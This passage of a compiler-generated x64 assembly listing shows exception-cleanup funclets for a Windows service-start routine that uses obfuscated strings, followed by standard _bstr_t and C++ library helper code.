?dtor$11@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$11
	mov	rcx, QWORD PTR $T3[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$11@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$11
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$14
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$14@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$14
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$15@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$15
	mov	rcx, QWORD PTR $T5[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$15@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$15
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$18
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$18@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$18
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?dtor$19@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::StartWindowsService'::`1'::dtor$19
	mov	rcx, QWORD PTR $T4[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$19@?0??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::StartWindowsService'::`1'::dtor$19
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@Data_t@_bstr_t@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@Data_t@_bstr_t@@QEAAX_K@Z PROC	; _bstr_t::Data_t::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	ret	0
?__autoclassinit2@Data_t@_bstr_t@@QEAAX_K@Z ENDP	; _bstr_t::Data_t::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??0_bstr_t@@QEAA@PEB_W@Z
_TEXT	SEGMENT
this$ = 48
s$ = 56
$T1 = 64
??0_bstr_t@@QEAA@PEB_W@Z PROC				; _bstr_t::_bstr_t, COMDAT

; 322  : {

$LN21:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rsi
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rsi, rdx
	mov	rdi, rcx

; 916  :     return ::operator new(sz);

	mov	ecx, 24
	call	??2@YAPEAX_K@Z				; operator new
	mov	rbx, rax
	mov	QWORD PTR $T1[rsp], rax

; 321  :     : m_Data(new Data_t(s))

	test	rax, rax
	je	SHORT $LN4@bstr_t
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rbx], xmm0
	mov	QWORD PTR [rbx+16], rax

; 689  :     : m_str(NULL), m_RefCount(1)

	mov	QWORD PTR [rbx+8], rax
	mov	DWORD PTR [rbx+16], 1

; 690  : {
; 691  :     m_wstr = ::SysAllocString(s);

	mov	rcx, rsi
	call	QWORD PTR __imp_SysAllocString
	mov	QWORD PTR [rbx], rax

; 692  : 
; 693  :     if (m_wstr == NULL && s != NULL) {

	test	rax, rax
	jne	SHORT $LN5@bstr_t
	test	rsi, rsi
	jne	SHORT $LN18@bstr_t
	jmp	SHORT $LN5@bstr_t
$LN4@bstr_t:

; 321  :     : m_Data(new Data_t(s))

	xor	ebx, ebx
$LN5@bstr_t:
	mov	QWORD PTR [rdi], rbx

; 323  :     if (m_Data == NULL) {

	test	rbx, rbx
	je	SHORT $LN19@bstr_t

; 325  :     }
; 326  : }

	mov	rax, rdi
	mov	rbx, QWORD PTR [rsp+48]
	mov	rsi, QWORD PTR [rsp+56]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN19@bstr_t:

; 324  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	npad	1
$LN18@bstr_t:

; 694  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	int	3
$LN16@bstr_t:
??0_bstr_t@@QEAA@PEB_W@Z ENDP				; _bstr_t::_bstr_t
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
s$ = 56
$T1 = 64
?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA PROC		; `_bstr_t::_bstr_t'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 24
	mov	rcx, QWORD PTR $T1[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0_bstr_t@@QEAA@PEB_W@Z@4HA ENDP		; `_bstr_t::_bstr_t'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??1_bstr_t@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1_bstr_t@@QEAA@XZ PROC				; _bstr_t::~_bstr_t, COMDAT

; 342  : {

$LN32:
	mov	QWORD PTR [rsp+16], rbx
	push	rdi
	sub	rsp, 32					; 00000020H

; 637  :     if (m_Data != NULL) {

	mov	rbx, QWORD PTR [rcx]

; 342  : {

	mov	rdi, rcx

; 637  :     if (m_Data != NULL) {

	test	rbx, rbx
	je	SHORT $LN5@bstr_t

; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	eax, -1
	lock xadd DWORD PTR [rbx+16], eax
	cmp	eax, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN15@bstr_t

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN22@bstr_t

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN22@bstr_t:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN23@bstr_t

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN23@bstr_t:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN15@bstr_t:

; 639  :         m_Data = NULL;

	mov	QWORD PTR [rdi], 0
$LN5@bstr_t:

; 343  :     _Free();
; 344  : }

	mov	rbx, QWORD PTR [rsp+56]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??1_bstr_t@@QEAA@XZ ENDP				; _bstr_t::~_bstr_t
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??B_bstr_t@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 48
??B_bstr_t@@QEBAPEBDXZ PROC				; _bstr_t::operator char const *, COMDAT

; 485  : {

$LN11:
	push	rbx
	sub	rsp, 32					; 00000020H

; 486  :     return (m_Data != NULL) ? m_Data->GetString() : NULL;

	mov	rbx, QWORD PTR [rcx]
	test	rbx, rbx
	je	SHORT $LN3@operator

; 825  :     if (m_str == NULL) {

	mov	rax, QWORD PTR [rbx+8]
	test	rax, rax
	jne	SHORT $LN4@operator

; 826  :         m_str = _com_util::ConvertBSTRToString(m_wstr);

	mov	rcx, QWORD PTR [rbx]
	call	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z ; _com_util::ConvertBSTRToString
	mov	QWORD PTR [rbx+8], rax

; 487  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN3@operator:

; 486  :     return (m_Data != NULL) ? m_Data->GetString() : NULL;

	xor	eax, eax
$LN4@operator:

; 487  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??B_bstr_t@@QEBAPEBDXZ ENDP				; _bstr_t::operator char const *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ?_Free@_bstr_t@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Free@_bstr_t@@AEAAXXZ PROC				; _bstr_t::_Free, COMDAT

; 636  : {

$LN29:
	mov	QWORD PTR [rsp+16], rbx
	push	rdi
	sub	rsp, 32					; 00000020H

; 637  :     if (m_Data != NULL) {

	mov	rbx, QWORD PTR [rcx]
	mov	rdi, rcx
	test	rbx, rbx
	je	SHORT $LN2@Free

; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	eax, -1
	lock xadd DWORD PTR [rbx+16], eax
	cmp	eax, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN12@Free

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN19@Free

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN19@Free:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN20@Free

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN20@Free:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN12@Free:

; 638  :         m_Data->Release();
; 639  :         m_Data = NULL;

	mov	QWORD PTR [rdi], 0
$LN2@Free:

; 640  :     }
; 641  : }

	mov	rbx, QWORD PTR [rsp+56]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
?_Free@_bstr_t@@AEAAXXZ ENDP				; _bstr_t::_Free
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??0Data_t@_bstr_t@@QEAA@PEB_W@Z
_TEXT	SEGMENT
this$ = 48
s$ = 56
??0Data_t@_bstr_t@@QEAA@PEB_W@Z PROC			; _bstr_t::Data_t::Data_t, COMDAT

; 690  : {

$LN9:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 689  :     : m_str(NULL), m_RefCount(1)

	mov	QWORD PTR [rcx+8], 0
	mov	DWORD PTR [rcx+16], 1
	mov	rdi, rdx

; 691  :     m_wstr = ::SysAllocString(s);

	mov	rcx, rdx
	call	QWORD PTR __imp_SysAllocString
	mov	QWORD PTR [rbx], rax

; 692  : 
; 693  :     if (m_wstr == NULL && s != NULL) {

	test	rax, rax
	jne	SHORT $LN2@Data_t
	test	rdi, rdi
	jne	SHORT $LN8@Data_t
$LN2@Data_t:

; 695  :     }
; 696  : }

	mov	rax, rbx
	mov	rbx, QWORD PTR [rsp+48]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN8@Data_t:

; 694  :         _com_issue_error(E_OUTOFMEMORY);

	mov	ecx, -2147024882			; ffffffff8007000eH
	call	?_com_issue_error@@YAXJ@Z		; _com_issue_error
	int	3
$LN6@Data_t:
??0Data_t@_bstr_t@@QEAA@PEB_W@Z ENDP			; _bstr_t::Data_t::Data_t
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ?Release@Data_t@_bstr_t@@QEAAKXZ
_TEXT	SEGMENT
this$ = 48
?Release@Data_t@_bstr_t@@QEAAKXZ PROC			; _bstr_t::Data_t::Release, COMDAT

; 772  : {

$LN27:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	edi, -1
	lock xadd DWORD PTR [rcx+16], edi
	sub	edi, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN20@Release

; 776  :         delete this;

	test	rcx, rcx
	je	SHORT $LN20@Release

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN15@Release

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN15@Release:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN16@Release

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN16@Release:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@Release:

; 777  :     }
; 778  : 
; 779  :     return cRef;
; 780  : }

	mov	rbx, QWORD PTR [rsp+48]
	mov	eax, edi
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
?Release@Data_t@_bstr_t@@QEAAKXZ ENDP			; _bstr_t::Data_t::Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??_GData_t@_bstr_t@@AEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$dead$ = 56
??_GData_t@_bstr_t@@AEAAPEAXI@Z PROC			; _bstr_t::Data_t::`scalar deleting destructor', COMDAT
$LN17:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN9@scalar

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN9@scalar:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN10@scalar

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN10@scalar:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??_GData_t@_bstr_t@@AEAAPEAXI@Z ENDP			; _bstr_t::Data_t::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ?GetString@Data_t@_bstr_t@@QEBAPEBDXZ
_TEXT	SEGMENT
this$ = 48
?GetString@Data_t@_bstr_t@@QEBAPEBDXZ PROC		; _bstr_t::Data_t::GetString, COMDAT

; 824  : {

$LN7:
	push	rbx
	sub	rsp, 32					; 00000020H

; 825  :     if (m_str == NULL) {

	mov	rax, QWORD PTR [rcx+8]
	mov	rbx, rcx
	test	rax, rax
	jne	SHORT $LN4@GetString

; 826  :         m_str = _com_util::ConvertBSTRToString(m_wstr);

	mov	rcx, QWORD PTR [rcx]
	call	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z ; _com_util::ConvertBSTRToString
	mov	QWORD PTR [rbx+8], rax
$LN4@GetString:

; 827  :     }
; 828  : 
; 829  :     return m_str;
; 830  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?GetString@Data_t@_bstr_t@@QEBAPEBDXZ ENDP		; _bstr_t::Data_t::GetString
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??2Data_t@_bstr_t@@SAPEAX_K@Z
_TEXT	SEGMENT
sz$dead$ = 8
??2Data_t@_bstr_t@@SAPEAX_K@Z PROC			; _bstr_t::Data_t::operator new, COMDAT

; 916  :     return ::operator new(sz);

	mov	ecx, 24
	jmp	??2@YAPEAX_K@Z				; operator new
??2Data_t@_bstr_t@@SAPEAX_K@Z ENDP			; _bstr_t::Data_t::operator new
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ??1Data_t@_bstr_t@@AEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1Data_t@_bstr_t@@AEAA@XZ PROC				; _bstr_t::Data_t::~Data_t, COMDAT

; 923  : {

$LN13:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN5@Data_t

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN5@Data_t:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN6@Data_t

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN6@Data_t:

; 924  :     _Free();
; 925  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??1Data_t@_bstr_t@@AEAA@XZ ENDP				; _bstr_t::Data_t::~Data_t
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
;	COMDAT ?_Free@Data_t@_bstr_t@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Free@Data_t@_bstr_t@@AEAAXXZ PROC			; _bstr_t::Data_t::_Free, COMDAT

; 930  : {

$LN10:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN2@Free

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], 0
$LN2@Free:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN3@Free

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], 0
$LN3@Free:

; 939  :     }
; 940  : }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
?_Free@Data_t@_bstr_t@@AEAAXXZ ENDP			; _bstr_t::Data_t::_Free
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ?_Fnv1a_append_bytes@std@@YA_K_KQEBE_K@Z
_TEXT	SEGMENT
_Val$dead$ = 8
_First$ = 16
_Count$ = 24
?_Fnv1a_append_bytes@std@@YA_K_KQEBE_K@Z PROC		; std::_Fnv1a_append_bytes, COMDAT

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	xor	r9d, r9d
	mov	rax, -3750763034362895579		; cbf29ce484222325H
	test	r8, r8
	je	SHORT $LN13@Fnv1a_appe
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	4
$LL9@Fnv1a_appe:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	ecx, BYTE PTR [rdx+r9]
	inc	r9
	xor	rax, rcx

; 2302 :         _Val *= _FNV_prime;

	imul	rax, r10
	cmp	r9, r8
	jb	SHORT $LL9@Fnv1a_appe
$LN13@Fnv1a_appe:

; 2303 :     }
; 2304 : 
; 2305 :     return _Val;
; 2306 : }

	ret	0
?_Fnv1a_append_bytes@std@@YA_K_KQEBE_K@Z ENDP		; std::_Fnv1a_append_bytes
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
;	COMDAT ?_Floor_of_log_2@std@@YAK_K@Z
_TEXT	SEGMENT
_Value$ = 8
?_Floor_of_log_2@std@@YAK_K@Z PROC			; std::_Floor_of_log_2, COMDAT

; 25   :     _Value |= size_t{1}; // avoid undefined answer from _BitScanReverse for 0

	or	rcx, 1

; 26   :     unsigned long _Result;
; 27   : 
; 28   : #ifdef _M_CEE_PURE
; 29   : #ifdef _WIN64
; 30   :     _Result = 63;
; 31   : #else // ^^^ 64-bit / 32-bit vvv
; 32   :     _Result = 31;
; 33   : #endif // ^^^ 32-bit ^^^
; 34   : 
; 35   :     while ((size_t{1} << _Result) > _Value) {
; 36   :         --_Result;
; 37   :     }
; 38   : #else // ^^^ defined(_M_CEE_PURE) / !defined(_M_CEE_PURE) vvv
; 39   : #ifdef _WIN64
; 40   :     _BitScanReverse64(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]

	bsr	rax, rcx

; 41   : #else // ^^^ 64-bit / 32-bit vvv
; 42   :     _BitScanReverse(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]
; 43   : #endif // ^^^ 32-bit ^^^
; 44   : #endif // ^^^ !defined(_M_CEE_PURE) ^^^
; 45   : 
; 46   :     return _Result;
; 47   : }

	ret	0
?_Floor_of_log_2@std@@YAK_K@Z ENDP			; std::_Floor_of_log_2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
;	COMDAT ?_Ceiling_of_log_2@std@@YAK_K@Z
_TEXT	SEGMENT
_Value$ = 8
?_Ceiling_of_log_2@std@@YAK_K@Z PROC			; std::_Ceiling_of_log_2, COMDAT

; 50   :                                                                                   // pre: _Value > 1
; 51   :     return 1 + _Floor_of_log_2(_Value - 1);

	lea	rax, QWORD PTR [rcx-1]

; 25   :     _Value |= size_t{1}; // avoid undefined answer from _BitScanReverse for 0

	or	rax, 1

; 26   :     unsigned long _Result;
; 27   : 
; 28   : #ifdef _M_CEE_PURE
; 29   : #ifdef _WIN64
; 30   :     _Result = 63;
; 31   : #else // ^^^ 64-bit / 32-bit vvv
; 32   :     _Result = 31;
; 33   : #endif // ^^^ 32-bit ^^^
; 34   : 
; 35   :     while ((size_t{1} << _Result) > _Value) {
; 36   :         --_Result;
; 37   :     }
; 38   : #else // ^^^ defined(_M_CEE_PURE) / !defined(_M_CEE_PURE) vvv
; 39   : #ifdef _WIN64
; 40   :     _BitScanReverse64(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]

	bsr	rax, rax

; 50   :                                                                                   // pre: _Value > 1
; 51   :     return 1 + _Floor_of_log_2(_Value - 1);

	inc	eax

; 52   : }

	ret	0
